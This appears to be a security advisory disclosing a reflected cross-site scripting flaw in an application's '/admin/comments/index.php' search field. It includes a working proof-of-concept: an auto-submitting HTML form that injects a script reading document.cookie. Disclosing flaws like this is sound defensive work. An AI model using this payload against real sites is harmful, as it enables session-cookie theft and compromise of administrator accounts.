The vulnerability exists due to failure in the "/admin/comments/index.php" script to properly sanitize user-supplied input in "f_comment_search" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.

An attacker can use browser to exploit this vulnerability. The following PoC is available:

<form action="http://host/admin/comments/index.php" method="post" name="main" >
<input type="hidden" name="f_comment_per_page" value="20" >
<input type="hidden" name="f_comment_search" value='1"><script>alert(document.cookie)</script>'>
<input type="hidden" name="f_comment_order_by" value="datestamp">
</form>
<script>
document.main.submit();
</script>
